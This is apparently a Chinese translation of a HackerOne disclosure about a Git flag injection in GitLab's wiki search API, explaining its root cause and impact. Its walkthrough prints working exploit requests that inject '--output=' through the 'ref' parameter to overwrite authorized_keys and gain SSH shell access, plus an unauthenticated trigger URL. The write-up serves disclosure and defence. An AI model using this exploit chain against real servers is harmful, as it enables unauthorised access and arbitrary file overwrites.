#  价值12000美元 的GitLab 中的 Git flag注入漏洞   
原创 漏洞集萃  漏洞集萃   2025-06-01 06:46  
  
****  
一个被滥用的 ref  
 参数和一个 Git CLI 的“小怪癖”如何让攻击者无需身份验证即可 SSH 登录 GitLab 服务器  
  
在一份提交给 GitLab 的高危漏洞报告中，安全研究员 vakzz 发现了一个严重漏洞，该漏洞始于一个看似无害的搜索 API 参数，最终却升级为通过 SSH 实现的远程代码执行。  
  
问题出在哪里呢？GitLab 搜索 API 中的 ref  
 参数使得 Git CLI 标志注入成为可能，攻击者可以借此覆盖任意文件，包括 SSH 密钥。  
  
这不仅让 vakzz 获得了 12,000 美元的漏洞赏金，也成为了一个绝佳案例，展示了后端工具中的命令行注入如何将一个低风险的攻击入口转变为全面的系统沦陷。  
### 漏洞摘要  
- GitLab 暴露了一个 /search  
 API，允许用户在项目 wiki 中使用 wiki_blobs  
 范围进行搜索。  
  
- 此 API 接受一个 ref  
 参数，用于指定 Git 引用，如分支或标签。  
  
- 但 GitLab 并未对该输入进行清理，而是将其直接作为参数传递给 Git CLI。  
  
- 这就为标志注入（例如，--output=/tmp/file  
）打开了大门，让攻击者能够控制 Git 写入数据的位置。  
  
### 逐步利用漏洞  
  
让我们一步步解析这个漏洞是如何从 HTML 层面被利用，一直到获取 shell 权限的。  
#### 1. 带有 ref 注入的易受攻击 API 调用  
  
攻击者使用 GitLab 针对 wiki_blobs  
 的搜索 API，通过 ref  
 参数注入一个标志：  
```
ounter(lineounter(line
curl --header "PRIVATE-TOKEN: $TOKEN" \
  'http://gitlab-vm.local/api/v4/projects/4/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'
```  
  
这会导致 GitLab 在后端执行一个如下所示的 Git 命令：  
```
ounter(lineounter(lineounter(line
/opt/gitlab/embedded/bin/git \
  --git-dir /var/opt/gitlab/git-data/repositories/...wiki.git \
  log --max-count=1 --output=/tmp/file
```  
  
被注入的 --output  
 标志告诉 Git 将提交日志写入 /tmp/file  
，攻击者随后便可以读取该文件。  
#### 2. 向文件写入受控内容  
  
为了控制文件内容，攻击者需要：  
1. 创建一个标题为 page  
 的新 Wiki 页面。  
  
1. 将该页面的提交信息设置为期望的载荷（例如，一个 SSH 密钥）。  
  
Git 提交的内容（即提交信息）就会成为写入到 /tmp/file  
 的内容。  
#### 3. 升级至 SSH 访问权限  
  
真正的“魔法”在于：用一个有效的 RSA 公钥覆盖 authorized_keys  
 文件。  
  
步骤如下：  
1. 生成一个 SSH 密钥：```
ssh-keygen -t rsa -f gitlab
```  
  
  
1.   
1. ounter(line  
1. 将提交信息设置为公钥内容：```
ssh-rsa AAAAB3... attacker@host
```  
  
  
1.   
1. ounter(line  
1. 通过 API 注入 ref=--output=/var/opt/gitlab/.ssh/authorized_keys  
：```
curl 'http://gitlab-vm.local/api/v4/projects/4/search?scope=wiki_blobs&search=page&ref=--output=/var/opt/gitlab/.ssh/authorized_keys'
```  
  
  
1.   
1. ounter(line  
1. 以 git  
 用户身份 SSH 登录 GitLab：```
ssh git@gitlab-vm.local -i gitlab
```  
  
  
1.   
1. ounter(line  
砰！现在你已经拥有了 git  
 用户的 shell 访问权限。  
#### 4. 额外惊喜：无需身份验证的触发方式  
  
更糟糕的是，这个漏洞甚至可以通过 Web 搜索在无需身份验证的情况下触发：  
```
ounter(line
http://gitlab-vm.local/search?scope=wiki_blobs&search=page&project_id=4&repository_ref=--output=/tmp/file
```  
  
虽然未经身份验证的用户无法控制提交信息，但这仍然允许创建任意文件，可能有助于进行侦察或发动 DoS 攻击。  
### 影响  
- **远程代码执行**  
：通过向 authorized_keys  
 文件注入 SSH 密钥，攻击者可以获得对 GitLab 服务器的 shell 访问权限。  
  
- **无需认证的攻击途径**  
：可以在没有登录凭证的情况下触发漏洞，尽管对文件内容的控制较少。  
  
- **文件覆盖**  
：可以写入或覆盖任意文件，从而危及日志、配置文件或身份验证文件。  
  
### 根本原因  
  
ref  
 参数未经清理就直接传递给了 Git CLI，从而允许注入任意标志（例如 --output  
、--config  
）。Git 会将这些标志解释为合法的 CLI 选项，而不是 Git 引用。  
###   
###   
  
![](https://mmbiz.qpic.cn/mmbiz_png/Y5LD4fX7WOLaPZe8pSjkbuAlrjT0OFFggomia22B9JE6RmXkUMllqsOXculdB3icUBzg7HRibCJBwbUpc2OPwXwOA/640?wx_fmt=png&from=appmsg "")  
####   
###   
  
  
  
  
****  
  
****  
  
====本文结束====  
  
以上内容由漏洞集萃翻译整理。  
  
参考：  
  
https://hackerone.com/reports/658013  
  
  
